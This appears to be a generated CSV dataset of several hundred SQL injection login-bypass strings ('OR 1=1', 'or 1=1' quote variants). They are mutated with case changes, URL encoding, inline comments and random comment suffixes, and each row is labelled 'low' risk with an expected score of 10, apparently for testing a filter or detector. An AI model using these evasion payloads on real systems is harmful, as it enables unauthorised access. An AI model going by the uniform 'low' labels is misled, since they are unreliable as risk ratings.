Query,Risk Level,Expected Score
"username"" OR 1=1;#",low,10
username'%20||%201=1;--,low,10
username'	OR	1=1;-- -- hSEvl,low,10
username' || 1=1;-- # MySQL comment # MySQL comment,low,10
"username""/**/OR/**/1=1;--",low,10
uSERName' Or 1=1;-- /* tEsT */,low,10
username' || 1=1;-- /* test */,low,10
username' or 1=1;-- /* test */ -- ULTkBr,low,10
"uSernaMe"" oR 1=1;--",low,10
USERNAME' OR 1=1;-- /* TEST */,low,10
ba3' OR 1=1;-- # MySQL comment,low,10
col3' OR 1=1;-- /* test */ -- orGhXtKS,low,10
username' OR 1=1;-- # RoXyBEyoC,low,10
USERNAME'%20OR%201=1;--,low,10
USERNAME' or 1=1;#,low,10
username'/**/OR/**/1=1;#,low,10
"username"" OR 1=1;-- -- gpMISJO",low,10
uSeRName' oR 1=1;--,low,10
unlqb3' OR 1=1;--,low,10
USERname'+or+1=1;--,low,10
USernAmE' OR 1=1;-- -- wTYBhcTmQA,low,10
username' OR 1=1;-- -- Zmzkj /* test */,low,10
username' OR 1=1;-- # oRYdkbowp,low,10
tmp18db' OR 1=1;--,low,10
USERNAME' OR 1=1;-- -- ODZUHFZTZ,low,10
username'%20OR%201=1;#,low,10
var0bu'+OR+1=1;--,low,10
username'/**/||/**/1=1;-- # BYtzaswBAW,low,10
uSeRnaME' OR 1=1;-- -- comment,low,10
C8' OR 1=1;-- /* test */,low,10
"username"" OR 1=1;-- -- comment",low,10
"USERNAME""/**/OR/**/1=1;--",low,10
username' || 1=1;-- # MySQL comment,low,10
USERNAME'%20or%201=1;--,low,10
USERNAME' OR 1=1;-- # yMjHbqZa,low,10
"username"" OR 1=1;-- /* test */",low,10
av62a5' OR 1=1;-- -- comment,low,10
username'%20OR%201=1;-- # MySQL comment,low,10
username'/**/||/**/1=1;--,low,10
username' OR 1=1;# # PzSLxOho,low,10
username' OR 1=1;-- # MySQL comment -- comment,low,10
username'/**/OR/**/1=1;--/**/--/**/ybajtQOkr,low,10
USERNAME' or 1=1;-- -- comment,low,10
"username"" or 1=1;--",low,10
"username"" OR 1=1;-- # sAqMEwCda",low,10
"USERNAME"" || 1=1;-- -- ynRhnc",low,10
username' or 1=1;-- /* test */,low,10
username' OR 1=1;-- # MySQL comment -- ApqdfZiwV,low,10
USERNAME' OR 1=1;-- -- bZUfAdoG,low,10
UsERNaME'%20OR%201=1;#	#	MysQL	CoMmEnT,low,10
tmpwv90h'%20or%201=1;--,low,10
username'/**/||/**/1=1;#,low,10
"USERNAME"" or 1=1;-- /* TEST */",low,10
usERnaMe' OR 1=1;--,low,10
tbln72'	OR	1=1;--	--	DEVQp	--	gjRxO,low,10
"TMP52K"" or 1=1;-- # mYsql COMMENT # KLBoa",low,10
USERNAME' OR 1=1;-- # lMmYl,low,10
"username""+OR+1=1;--",low,10
UsERNAme' oR 1=1;# # MySQL comment,low,10
username'%20or%201=1;-- -- KdanHOBd,low,10
username'	OR	1=1;#	#	YWImbjJpJ,low,10
USeRnaMe' Or 1=1;-- /* TEst */ /* teSt */,low,10
username'%20or%201=1;--%20#%20MySQL%20comment,low,10
USERNAME'+||+1=1;--+/*+TEST+*/+#+ChkYjU,low,10
xjpg'/**/||/**/1=1;-- /* test */,low,10
xsb'+OR+1=1;--,low,10
TMPJnCf' OR 1=1;--,low,10
username'+OR+1=1;#,low,10
USERNAME' OR 1=1;-- # ZTJDOCHQIW /* test */,low,10
tbl2d'%20OR%201=1;--,low,10
username' OR 1=1;# /* test */ -- comment,low,10
"username""	OR	1=1;-- # kGvnLRaDTh",low,10
uSERnamE' oR 1=1;-- -- cOMmEnt -- COmMent,low,10
USERNAME'/**/||/**/1=1;--/**//*/**/TEST/**/*/,low,10
username' || 1=1;# # KmCiyh # TSnzdMWuv,low,10
username'+or+1=1;-- -- comment -- hmukfjrrwu -- ycfdg,low,10
USErNaMe' or 1=1;--,low,10
USERNAME' || 1=1;-- # SZZHMVPZNZ -- comment,low,10
USERNAME'+OR+1=1;--+#+MYSQL+COMMENT+--+COMMENT,low,10
YUEWSI'	or	1=1;--	--	COMMENT,low,10
ciff'	OR	1=1;#,low,10
USERNAME' or 1=1;-- # HGBUI -- comment,low,10
usERNAME'/**/Or/**/1=1;-- # MySqL commENT,low,10
username'  OR  1=1;#  #  wRtKhOK # MySQL comment,low,10
username'	OR	1=1;--	--	CnYxbMGIE	#	MySQL	comment,low,10
"A8A2YG""	OR	1=1;--",low,10
username'+OR+1=1;--+/*+test+*/,low,10
username'+or+1=1;--,low,10
USERNAME'%20||%201=1;--%20--%20ZJIXLKWIUP,low,10
UseRNaMe'+or+1=1;--,low,10
username'%20OR%201=1;--%20/*%20test%20*/%20/*%20test%20*/,low,10
usErName' OR 1=1;-- -- ltHonvLs,low,10
username'	||	1=1;--,low,10
username' || 1=1;#,low,10
username'	||	1=1;--	/*	test	*/ -- comment,low,10
username'+OR+1=1;--+#+odtIqiX+/*+test+*/,low,10
USERNAME'+or+1=1;--,low,10
username' OR 1=1;-- # KvBiTm -- comment,low,10
"USERNAME"" OR 1=1;-- /* TEST */",low,10
ufKqoH'%20Or%201=1;--,low,10
username' OR 1=1;-- -- comment # KhaRDktKF -- pegPrNvCI,low,10
username'	OR	1=1;-- # xOIABq,low,10
"tblu"" OR 1=1;--",low,10
tblde1' OR 1=1;-- /* test */,low,10
username'+OR+1=1;--+--+MYjVQoM+--+comment+/*+test+*/,low,10
username'%20||%201=1;--%20--%20OpNNYj,low,10
USERNAME'/**/OR/**/1=1;#,low,10
"username"" OR 1=1;-- -- pfLquI -- comment",low,10
USERNAME'%20or%201=1;--%20/*%20TEST%20*/,low,10
UsErnAme'+Or+1=1;--,low,10
x4d84'%20OR%201=1;--,low,10
uSERNAME'%20oR%201=1;--%20#%20MySQL%20comment%20#%20MySQL%20comment,low,10
USERNAME'+OR+1=1;#,low,10
USERNAME'/**/OR/**/1=1;--,low,10
"username""	||	1=1;#",low,10
"USErnAME""%20Or%201=1;-- -- OxNQeHhA",low,10
USERNAME' OR 1=1;-- -- XRGftLGux,low,10
"username"" || 1=1;-- -- OYdjMhuy",low,10
USERNAME' or 1=1;# # comment,low,10
USERNAME'	OR	1=1;-- # MYSQL COMMENT,low,10
"USERNAME"" OR 1=1;-- -- COMMENT # MySQL comment # MySQL comment",low,10
username' or 1=1;# # pjmwhceug # comment,low,10
USERNAME' || 1=1;--,low,10
vArYZ' oR 1=1;-- # MysQL coMmENt,low,10
"username""%20OR%201=1;--%20#%20hvwREzeEK%20#%20MySQL%20comment",low,10
UseRnamE'%20or%201=1;--,low,10
B8YAMZ'  OR  1=1;--  /*  test  */,low,10
col7' or 1=1;--,low,10
username'/**/||/**/1=1;--/**/#/**/MySQL/**/comment/**/#/**/lgMnBCkDuf,low,10
username'%20OR%201=1;# # NrfrAsr,low,10
username'/**/OR/**/1=1;--/**//*/**/test/**/*/ -- comment,low,10
AT0'	Or	1=1;--,low,10
USERNAME'%20OR%201=1;--%20#%20JWWIRZ,low,10
"useRnAME""%20Or%201=1;# /* test */",low,10
username' OR 1=1;-- -- comment -- comment,low,10
"username""	or	1=1;#",low,10
userNaME'/**/Or/**/1=1;-- # MySQL comment,low,10
USERNAME'/**/or/**/1=1;--/**//*/**/TEST/**/*//**/--/**/lSdpGz,low,10
username'%20or%201=1;-- -- MJHyk,low,10
username'	or	1=1;--	#	wdgpp,low,10
AS'	OR	1=1;-- /* test */,low,10
USERNAME'/**/||/**/1=1;--,low,10
usErName' OR 1=1;#,low,10
username'/**/OR/**/1=1;-- -- pYQJGRu,low,10
"USERNAME"" OR 1=1;-- # MYSQL COMMENT",low,10
username'+OR+1=1;--+--+lyUtBu/**/#/**/MySQL/**/comment,low,10
usERnamE' || 1=1;-- # MySQL comment,low,10
TBLFX' OR 1=1;-- -- COMMENT,low,10
USERNAME' OR 1=1;-- -- COMMENT,low,10
username' or 1=1;-- -- tHGfzbCC # jbufkiuB,low,10
USERNAME'%20or%201=1;--%20--%20comment,low,10
tblp'%20OR%201=1;#,low,10
"USERNAME""+OR+1=1;#+#+MySQL+comment",low,10
username'	OR	1=1;--	#	MySQL	comment -- XhLJFTpY,low,10
uSERNAmE'+||+1=1;--,low,10
cirb'	||	1=1;--	--	hElwQbxeYF,low,10
USERnAmE' oR 1=1;-- # MySQL comment /* test */,low,10
username' OR 1=1;# # comment,low,10
username' || 1=1;-- # YFUbfzBwoX # MySQL comment,low,10
"c5""%20OR%201=1;--%20#%20bwKTcjFcE",low,10
username'+OR+1=1;-- -- QdRyOHVF,low,10
username'/**/OR/**/1=1;-- # MySQL comment,low,10
"username"" OR 1=1;-- # MySQL comment",low,10
"username""	or	1=1;--	#	mysql	comment # WwHMFFr",low,10
username' || 1=1;# # MySQL comment,low,10
"USERNAME""	or	1=1;--",low,10
' or '1'='1'#,low,10
'%20or%20'1'='1'#,low,10
' or '1'='1'# -- comment,low,10
""" or ""1""=""1""# -- iptUai",low,10
'	or	'1'='1'#	--	comment,low,10
'+Or+'1'='1'#,low,10
'+OR+'1'='1'#+#+MySQL+comment,low,10
'/**/or/**/'1'='1'#,low,10
' or '1'='1'# # EttqWa,low,10
' or '1'='1'# # MySQL comment,low,10
' or '1'='1'# # MySQL comment -- AZqxFaVUc,low,10
'+or+'1'='1'#,low,10
'	or	'1'='1'#,low,10
""" or ""1""=""1""# # AkYhJQDVlr -- QvYiE",low,10
'	OR	'1'='1'#,low,10
' OR '1'='1'#,low,10
"""/**/or/**/""1""=""1""#",low,10
"""+or+""1""=""1""#",low,10
' OR '1'='1'# -- oUQVXU,low,10
""" or ""1""=""1""#",low,10
'  or  '1'='1'#,low,10
' or '1'='1'# /* test */,low,10
' or '1'='1'# -- comment # MySQL comment,low,10
'%20or%20'1'='1'# /* test */,low,10
'	or	'1'='1'# -- comment,low,10
' Or '1'='1'#,low,10
'%20or%20'1'='1'# -- comment,low,10
'/**/or/**/'1'='1'#/**/#/**/TSHzx,low,10
'%20OR%20'1'='1'# -- COMMENT,low,10
' || '1'='1'#,low,10
'	OR	'1'='1'# # HaLOIlQO,low,10
' or '1'='1'# # DybadWGA /* test */,low,10
'	or	'1'='1'# # MySQL comment,low,10
'%20or%20'1'='1'#%20#%20MySQL%20comment,low,10
'%20or%20'1'='1'# # LjSiJolXpu,low,10
'+or+'1'='1'#+/*+test+*/,low,10
' OR '1'='1'# -- roFnlw,low,10
' OR '1'='1'# -- comment,low,10
""" or ""1""=""1""# # MySQL comment",low,10
'%20OR%20'1'='1'#,low,10
' or '1'='1'# -- RPhYQ,low,10
' OR '1'='1'# # sgggc,low,10
"""	or	""1""=""1""#",low,10
' oR '1'='1'# # jjQnSHqSfK,low,10
' or '1'='1'# -- MhAZAkD -- comment,low,10
'/**/OR/**/'1'='1'#,low,10
' or '1'='1'# -- comment # bwttetv,low,10
' oR '1'='1'#,low,10
' or '1'='1'# # uGgqgfA,low,10
' or '1'='1'# # VtUtQlC,low,10
' or '1'='1'# # eQQiUXz,low,10
' or '1'='1'# # oMvNyFRnr,low,10
'+or+'1'='1'# # XbGPKJU -- BPsbsUwY,low,10
'+OR+'1'='1'#+#+BigQzHQkZ,low,10
'+or+'1'='1'#+#+MySQL+comment+#+azDfSQKRm,low,10
' OR '1'='1'# -- zBodnvc,low,10
' or '1'='1'# -- aUQkftJlZ,low,10
'+or+'1'='1'# -- comment,low,10
'	oR	'1'='1'#,low,10
' Or '1'='1'# /* teST */,low,10
'+or+'1'='1'#+--+dLIEN,low,10
'+OR+'1'='1'#,low,10
' or '1'='1'# -- gIVHHrMA # MySQL comment,low,10
'/**/or/**/'1'='1'#/**/#/**/MySQL/**/comment,low,10
'/**/OR/**/'1'='1'#/**/--/**/TEUARD,low,10
' or '1'='1'# -- JecpgRX,low,10
'  or  '1'='1'# # xEiAjxyW,low,10
' oR '1'='1'# # MBEhVD,low,10
' Or '1'='1'# # ELIFxX,low,10
'/**/or/**/'1'='1'#/**/#/**/VLkfBpzoK,low,10
' or '1'='1'# # oiMAmcmjXM,low,10
' or '1'='1'# /* test */ /* test */,low,10
' or '1'='1'# # mysql comment,low,10
'/**/or/**/'1'='1'#/**//*/**/test/**/*/ /* test */,low,10
'/**/or/**/'1'='1'# -- ZQvOO,low,10
'	oR	'1'='1'# # dsDQWJp,low,10
'/**/or/**/'1'='1'# /* test */,low,10
'%20or%20'1'='1'#	--	comment,low,10
' or '1'='1'# # HQNzQDdRME -- comment,low,10
'  or  '1'='1'# # BLirmHHu,low,10
' or '1'='1'# # axjvt,low,10
'/**/or/**/'1'='1'#/**/--/**/comment,low,10
'  oR  '1'='1'#,low,10
'%20or%20'1'='1'# # hsWihNHBmp,low,10
'+OR+'1'='1'#+#+KOIZRG -- COMMENT,low,10
' or '1'='1'# # MySQL comment # ATRcYhDhdZ,low,10
'%20or%20'1'='1'#	/*	test	*/,low,10
"""	or	""1""=""1""# /* test */",low,10
' OR '1'='1'# /* test */ # NCoBv,low,10
'/**/OR/**/'1'='1'#%20#%20MySQL%20comment,low,10
' or '1'='1'# /* test */ # ansCtbO,low,10
'/**/or/**/'1'='1'# # CckGmIKW,low,10
""" or ""1""=""1""# -- QudIM",low,10
"""%20or%20""1""=""1""# -- ATDDbUGC",low,10
'/**/or/**/'1'='1'# -- comment,low,10
'+OR+'1'='1'#+--+COMMENT # MIAaOPubXp,low,10
'	or	'1'='1'#	#	COmmeNt,low,10
' or '1'='1'# -- LWVyLqQV,low,10
"""	or	""1""=""1""# # MySQL comment # FAXHHEsHI",low,10
'%20or%20'1'='1'#%20#%20bkuasq,low,10
' or '1'='1'# -- xZzYvuDzf,low,10
' or '1'='1'# # BcGuY,low,10
""" OR ""1""=""1""#",low,10
'%20OR%20'1'='1'# -- PTDMZ -- comment,low,10
' or '1'='1'# # MySQL comment # cpySYpO,low,10
'+or+'1'='1'# /* test */,low,10
' or '1'='1'# -- iiLKq # MySQL comment,low,10
"""	or	""1""=""1""# # MySQL comment",low,10
' or '1'='1'# -- comment /* test */ # MySQL comment,low,10
'	or	'1'='1'#	#	MySQL	comment,low,10
'/**/Or/**/'1'='1'#,low,10
' OR '1'='1'# # ODRLHV,low,10
'	OR	'1'='1'#	#	MYSQL	COMMENT,low,10
' OR '1'='1'# # qpKJufTRD,low,10
'/**/OR/**/'1'='1'#/**/--/**/NDxMMK,low,10
""" or ""1""=""1""# # VSkecy",low,10
'%20or%20'1'='1'#%20--%20heuLdFTSGz,low,10
' or '1'='1'# -- comment -- comment,low,10
'	OR	'1'='1'#	--	COMMENT,low,10
'+Or+'1'='1'#+#+zoDnlMMKm,low,10
' OR '1'='1'# -- COMMENT -- CKZJEJRSS,low,10
'%20or%20'1'='1'#%20--%20WNRzqZJGJG,low,10
'+OR+'1'='1'# -- fygKnj,low,10
' OR '1'='1'# # MySQL comment # MySQL comment,low,10
'/**/or/**/'1'='1'#/**//*/**/test/**/*/,low,10
'/**/Or/**/'1'='1'# # MySQL comment,low,10
'%20or%20'1'='1'#/**//*/**/test/**/*/,low,10
' or '1'='1'# # comment # OpqVB,low,10
'%20or%20'1'='1'# -- lPqWbt,low,10
' OR '1'='1'# # JTALKY /* TEST */,low,10
' or '1'='1'# # eadJyX,low,10
'/**/Or/**/'1'='1'#/**//*/**/teSt/**/*/ -- pAHppip,low,10
' OR '1'='1'# # xtKpByD,low,10
' OR '1'='1'# -- hlHHGsQNB,low,10
' or '1'='1'# # pzhVheS,low,10
'	or	'1'='1'#	#	MySQL	comment -- comment,low,10
'%20or%20'1'='1'# -- CYBgB,low,10
'%20or%20'1'='1'#%20--%20comment,low,10
'		OR		'1'='1'#	--	COMMENT,low,10
' OR '1'='1'# /* TEST */,low,10
'+||+'1'='1'#,low,10
' or '1'='1'# # zwOcIhlxWR,low,10
' or '1'='1'# -- jrFYIba,low,10
'+or+'1'='1'#+/*+test+*/+#+MySQL+comment,low,10
'%20OR%20'1'='1'#%20/*%20TEST%20*/,low,10
' or '1'='1'# /* test */ -- yimbtAHV -- comment # DJIpAMDJEt,low,10
' OR '1'='1'# # MySQL comment,low,10
' or '1'='1'# # MySQL comment -- VBitRLipgf -- comment,low,10
'/**/OR/**/'1'='1'# -- NNMlZf,low,10
'/**/or/**/'1'='1'#/**/#/**/frbreni # gSbFsmpom,low,10
'/**/oR/**/'1'='1'#/**//*/**/Test/**/*//**/--/**/eYAZfLzAZ,low,10
' or '1'='1'# -- mXujAld -- LozCyd,low,10
""" OR ""1""=""1""# -- WlKLrwCyNL",low,10
""" OR ""1""=""1""# /* TEST */ -- COMMENT",low,10
'+or+'1'='1'# # MySQL comment,low,10
""" or ""1""=""1""# # mysql comment",low,10
'	OR	'1'='1'# # TxiTol,low,10
"""  or  ""1""=""1""#",low,10
'/**/OR/**/'1'='1'#/**/#/**/AZUQTACPR,low,10
' OR '1'='1'# -- COMMENT,low,10
'/**/or/**/'1'='1'#/**/#/**/czptoiamzj,low,10
' or '1'='1'# /* test */ -- VUFLTDwhjo,low,10
' OR '1'='1'# -- IZZLG # rNhFbGar,low,10
' OR '1'='1'# # COMMENT,low,10
' OR '1'='1'# # MYSQL COMMENT -- bIGxxXSyHv,low,10
'%20or%20'1'='1'#%20/*%20test%20*/ # MySQL comment,low,10
' or '1'='1'# -- RbNNTjffXX,low,10
'/**/OR/**/'1'='1'#/**/#/**/mYsql/**/COMMENT,low,10
' or '1'='1'# -- comment -- xwAvwOdR -- comment,low,10
' or '1'='1'# -- dCwOUX,low,10
'/**/OR/**/'1'='1'#/**//*/**/test/**/*/,low,10
'/**/or/**/'1'='1'#/**/--/**/IxOzSwkz,low,10
' or '1'='1'# -- SbmIcz # wVjhQvAyFb,low,10
'++or++'1'='1'#+#+MySQL+comment,low,10
'	or	'1'='1'#	--	GBcMmjKwY,low,10
""" or ""1""=""1""# -- comment # JKFcQNLNV",low,10
'+or+'1'='1'#%20#%20ofccyjbo,low,10
'+or+'1'='1'#+#+MySQL+comment,low,10
'+or+'1'='1'#+--+QAYTozn /* test */,low,10
'/**/or/**/'1'='1'#/**/--/**/ztIVneeL%20--%20JXuhBBHlY,low,10
'	oR	'1'='1'#	--	comment,low,10
'/**/or/**/'1'='1'#/**/#/**/UPnfLuPw,low,10
' OR '1'='1'# /* test */ # IBMPQ,low,10
' Or '1'='1'# # MySQL comment # MySQL comment,low,10
""" or ""1""=""1""# # MySQL comment # MySQL comment",low,10
'  or  '1'='1'# # MySQL comment,low,10
' or '1'='1'# -- IxGTfsm,low,10
' or '1'='1'# # mysql comment # MySQL comment -- comment,low,10
' or '1'='1'# -- onKjANO,low,10
""" or ""1""=""1""# -- comment /* test */",low,10
' or '1'='1'# # pmnclajzkm -- comment,low,10
' or '1'='1'# # cJamZg -- comment,low,10
'%20or%20'1'='1'#%20/*%20test%20*/,low,10
'%20or%20'1'='1'#%20#%20PFFVWID # dDGVHoP,low,10
'	Or	'1'='1'#,low,10
'	OR	'1'='1'#	#	UUAuMMv /* test */,low,10
'%20oR%20'1'='1'#%20#%20MYSQL%20COmMenT,low,10
'    or    '1'='1'#,low,10
"""%20OR%20""1""=""1""#",low,10
'/**/or/**/'1'='1'#/**/#/**/comment,low,10
' or '1'='1'# # mCVJyXU -- cbjVyxD,low,10
'%20or%20'1'='1'# # ZQpuc,low,10
'/**/or/**/'1'='1'# # NdZRp,low,10
'%20or%20'1'='1'# # MySQL comment,low,10
'	or	'1'='1'#	#	EflAKs,low,10
""" or ""1""=""1""# -- OKXXASZ",low,10
'+or+'1'='1'# # eDiqbORu,low,10
"""	or	""1""=""1""# /* test */ -- jybOwYFM",low,10
' or '1'='1'# -- jmqrhJpS,low,10
' or '1'='1'# # MySQL comment /* test */,low,10
' OR '1'='1'# # EOISBARIS,low,10
' OR '1'='1'# /* test */,low,10
' or '1'='1'# -- HBoeW # MySQL comment /* test */,low,10
'%20OR%20'1'='1'#%20#%20PDrSa # MySQL comment,low,10
'+OR+'1'='1'#+#+comment,low,10
"""+or+""1""=""1""#+--+unrWqG",low,10
'+or+'1'='1'#+#+pELYMTirQE,low,10
"""+or+""1""=""1""#	#	dptjmqo",low,10
""" or ""1""=""1""# -- fGpCd -- GDxSAdto",low,10
' OR '1'='1'# -- LYBTNNYN,low,10
"""	or	""1""=""1""# -- comment",low,10
' or '1'='1'# -- rScBsxmlr # MySQL comment,low,10
' or '1'='1'# # hefaAEkr,low,10
' or '1'='1'# # MySQL comment -- comment,low,10
' Or '1'='1'# # MyPQCtGg,low,10
' OR '1'='1'# # mYsql COMMENT,low,10
' or '1'='1'# -- hVhfFyiU /* test */,low,10
"""/**/or/**/""1""=""1""# /* test */",low,10
'+OR+'1'='1'# # LhWXH,low,10
"""+or+""1""=""1""# /* test */",low,10
' oR '1'='1'# /* test */,low,10
'%20or%20'1'='1'#%20#%20VsOeR,low,10
'/**/or/**/'1'='1'#/**//*/**/test/**/*/%20--%20comment,low,10
' or '1'='1'# # ymhaa,low,10
'/**/or/**/'1'='1'# # MySQL comment -- comment,low,10
'	or	'1'='1'# /* test */ /* test */,low,10
' or '1'='1'# -- UVdIwoIfL -- Paxve -- comment,low,10
'%20||%20'1'='1'#,low,10
'+or+'1'='1'#+--+TFTVaNSe,low,10
""" or ""1""=""1""# -- zPBTSjUR",low,10
' or '1'='1'# # UdiFiZ,low,10
'  OR  '1'='1'#  #  MySQL  comment,low,10
'/**/or/**/'1'='1'# # idHCScWK -- comment,low,10
' OR '1'='1'# -- COMMENT /* TEST */ # mYsql COMMENT,low,10
'+OR+'1'='1'#/**//*/**/test/**/*/,low,10
'%20or%20'1'='1'#%20/*%20test%20*/%20#%20wZmxjRTdUE,low,10
'+or+'1'='1'#	#	MySQL	comment,low,10
'/**/or/**/'1'='1'#+/*+test+*/,low,10
' Or '1'='1'# -- COquwfwPp,low,10
'	OR	'1'='1'#	/*	tesT	*/	--	XUGIE,low,10
' or 1=1;#,low,10
' OR 1=1;#,low,10
'+or+1=1;#,low,10
'%20or%201=1;#,low,10
' or 1=1;# -- zSvVHYXpCy,low,10
'	or	1=1;#,low,10
'+OR+1=1;#,low,10
""" or 1=1;#",low,10
'/**/or/**/1=1;#,low,10
' or 1=1;# # MySQL comment,low,10
'/**/OR/**/1=1;# -- POygnl,low,10
'/**/or/**/1=1;#/**/--/**/comment,low,10
' or 1=1;# -- FIXUKxuq,low,10
'%20or%201=1;# /* test */,low,10
'%20or%201=1;# # AtGFRKJl,low,10
' OR 1=1;# # DvVzdUN,low,10
' or 1=1;# # bhlgT,low,10
' or 1=1;# /* test */ -- comment,low,10
'%20OR%201=1;#,low,10
' or 1=1;# /* test */,low,10
' OR 1=1;# # XZPbGbjJ,low,10
'/**/or/**/1=1;# /* test */,low,10
'%20or%201=1;# # kzaHCR,low,10
' or 1=1;# # iCiNMK,low,10
' or 1=1;# # MySQL comment # MySQL comment,low,10
'  or  1=1;# # MySQL comment,low,10
' or 1=1;# # MySQL comment /* test */,low,10
'%20%20or%20%201=1;#,low,10
' or 1=1;# -- KInZUE,low,10
'	or	1=1;# # njbnD,low,10
' or 1=1;# -- comment,low,10
' or 1=1;# /* test */ /* test */,low,10
' OR 1=1;# -- XUVYDBDYKH,low,10
'/**/or/**/1=1;#/**//*/**/test/**/*/,low,10
' or 1=1;# -- EffQPNp,low,10
' oR 1=1;#,low,10
'%20or%201=1;#%20--%20DdobZUv,low,10
' or 1=1;# # yTKJe # lpyYhibvo,low,10
""" OR 1=1;#",low,10
' or 1=1;# -- OzQSJzozyr,low,10
'/**/or/**/1=1;# # mWHpHlhFw,low,10
' or 1=1;# -- comment /* test */,low,10
"""/**/or/**/1=1;#",low,10
'%20OR%201=1;#%20#%20MySQL%20comment,low,10
'/**/or/**/1=1;# -- iWchTs,low,10
' or 1=1;# # dZqOiZeKn,low,10
'/**/OR/**/1=1;# # MySQL comment,low,10
' or 1=1;# # MXzkLho,low,10
' or 1=1;# -- KmNoSMeRy,low,10
""" or 1=1;# # MySQL comment",low,10
""" Or 1=1;#",low,10
' OR 1=1;# # YZCWFF,low,10
' or 1=1;# -- iHjuPh,low,10
' or 1=1;# -- xzwIj,low,10
'+or+1=1;# # HdjzMmzA,low,10
' OR 1=1;# /* TEST */,low,10
'/**/or/**/1=1;# # MySQL comment # MySQL comment,low,10
' Or 1=1;#,low,10
'+or+1=1;#+--+comment,low,10
'/**/OR/**/1=1;#,low,10
' Or 1=1;# /* tEST */ # MySQL comment,low,10
' or 1=1;# # UMNxAtUE,low,10
' or 1=1;# -- KbTYw,low,10
'	or	1=1;#	--	comment,low,10
"""	oR	1=1;#",low,10
"""	or	1=1;#",low,10
' or 1=1;# # hDryWA # tbVbmAI,low,10
' or 1=1;# # MySQL comment -- yHQzFjLi,low,10
'+or+1=1;# /* test */,low,10
' or 1=1;# # sOAVb,low,10
"""%20or%201=1;#",low,10
' or 1=1;# -- RWLTIOqw -- comment,low,10
' or 1=1;# # gkFmdNP,low,10
' or 1=1;# # psIhSYSfVP # QEEQs,low,10
""" or 1=1;# # MySQL comment -- YeJnZGWmBg",low,10
' or 1=1;# -- zfTOKDjcNz,low,10
'%20or%201=1;# -- comment,low,10
' or 1=1;# # WUrVDTcy,low,10
' OR 1=1;# # MKWFRHD,low,10
'  or  1=1;#,low,10
' OR 1=1;# /* TEST */ # XTOBNTDSR,low,10
"""%20or%201=1;# /* test */",low,10
'	or	1=1;#	--	COmMenT,low,10
'%20or%201=1;# # MySQL comment,low,10
""" or 1=1;# -- comment",low,10
' or 1=1;# -- EtcggSCcx,low,10
'/**/||/**/1=1;#,low,10
'	OR	1=1;#,low,10
' OR 1=1;# -- dmbbvG # mYsql COMMENT,low,10
"""%20OR%201=1;# -- EycLkKBeKF",low,10
' Or 1=1;# -- cOmMEnt /* test */,low,10
'%20oR%201=1;# -- zPUbFZukV,low,10
'%20||%201=1;#,low,10
' OR 1=1;# # Rsvtupe,low,10
'/**/oR/**/1=1;#/**/#/**/MySQL/**/comment,low,10
'+or+1=1;# -- MPXPtsMH,low,10
' OR 1=1;# # MySQL comment,low,10
'	oR	1=1;#	/*	test	*/,low,10
"""+or+1=1;# -- comment",low,10
'	or	1=1;# # MySQL comment,low,10
'+or+1=1;# # zwlddf,low,10
"""+OR+1=1;#+#+MySQL+comment",low,10
'	OR	1=1;#	--	comment,low,10
'	or	1=1;# # MySQL comment # RqADEdBYC,low,10
' or 1=1;# /* test */ # MySQL comment,low,10
'/**/or/**/1=1;# -- ZwfvMjJ,low,10
'%20oR%201=1;#%20#%20mYSQl%20commEnT,low,10
'  OR  1=1;#  --  COMMEnt -- VfMYBmeZhA # voMArLd,low,10
' oR 1=1;# # HLPCat,low,10
'/**/or/**/1=1;# # MySQL comment # bQPhQtB,low,10
'	OR	1=1;#	#	MYSQL	COMMENT,low,10
'/**/or/**/1=1;#/**/#/**/rgkwz -- aoubm,low,10
'		OR		1=1;#,low,10
'%20OR%201=1;# -- COMMENT,low,10
'/**/or/**/1=1;# -- comment # ORqXL,low,10
' or 1=1;# # MySQL comment -- ewWCHMeM,low,10
'/**/or/**/1=1;#/**/#/**/mysql/**/comment /* test */ -- comment,low,10
'	or	1=1;# /* test */,low,10
'%20or%201=1;#/**/--/**/comment/**/#/**/gpmDx,low,10
'/**/or/**/1=1;# -- comment,low,10
' or 1=1;# -- OwOPMa,low,10
'%20or%201=1;# /* test */ -- jcoylqhLXb # NXBrCmrj,low,10
' or 1=1;# -- CgyZtiwNeX,low,10
' OR 1=1;# /* TEST */ # mYsql COMMENT,low,10
'+OR+1=1;#+--+COMMENT+#+GOVTDY,low,10
'+or+1=1;#  --  muKwkmHTF,low,10
"""+OR+1=1;#",low,10
""" or 1=1;# # mysQl coMmeNt",low,10
' or 1=1;# /* test */ # UXoFT,low,10
'	OR	1=1;#	#	MySQL	comment,low,10
'		or		1=1;#	/*	test	*/,low,10
